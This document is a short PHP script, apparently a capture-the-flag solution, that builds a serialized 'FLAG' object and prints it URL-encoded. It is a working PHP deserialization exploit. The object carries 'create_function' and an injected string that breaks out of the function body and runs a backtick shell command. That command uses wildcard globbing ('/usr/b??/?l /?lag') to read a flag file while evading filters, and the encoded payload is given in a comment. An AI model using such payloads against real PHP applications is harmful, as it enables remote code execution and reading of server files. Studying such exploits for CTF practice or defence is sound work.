<?php
class FLAG
{
        private $a;
        protected $b;
        public function __construct($a, $b)
            {
                $this->a = $a;
                $this->b = $b;
            }
        public function __destruct()
            {
                $a = (string)$this->a;
                $b = (string)$this->b;
            }
}

$exp = new FLAG("create_function", ";}var_dump(`/usr/b??/?l /?lag`);/*");
$exp = serialize($exp);
echo urlencode($exp);

# O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A34%3A%22%3B%7Dvar_dump%28%60%2Fusr%2Fb%3F%3F%2F%3Fl+%2F%3Flag%60%29%3B%2F%2A%22%3B%7D